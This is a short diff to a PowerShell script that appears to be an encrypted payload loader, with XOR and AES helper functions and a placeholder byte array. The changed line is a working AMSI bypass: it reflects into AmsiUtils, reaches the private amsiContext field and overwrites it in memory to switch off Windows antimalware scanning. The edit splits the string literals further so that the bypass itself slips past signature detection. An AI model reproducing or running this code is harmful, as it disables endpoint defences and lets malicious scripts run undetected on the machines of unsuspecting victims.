@@ -63,7 +63,7 @@ function De-Xor {
 
 $key = Create-AesKey
 $key
-$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x31323334)
+$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'si'+'Ut'+'ils');$y=$x.GetField('am'+'siC'+'on'+'te'+'xt',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x31323334)
 
 
 #This is filler data, you will need to generate the byte array
